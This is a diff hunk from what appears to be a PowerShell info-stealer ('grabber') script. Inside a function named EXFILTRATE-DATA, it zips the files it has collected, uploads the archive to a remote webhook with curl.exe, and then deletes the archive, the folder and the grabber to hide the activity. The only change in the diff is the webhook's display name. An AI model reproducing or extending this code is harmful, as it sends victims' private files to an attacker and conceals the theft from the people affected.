@@ -511,7 +511,7 @@ function EXFILTRATE-DATA {
     }
     
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
-    curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
+    curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
     Remove-Item "$extracted\KDOT.zip" -Force
     Remove-Item "$extracted\KDOT" -Recurse -Force
     Remove-Item "$filegrabber" -recurse -force
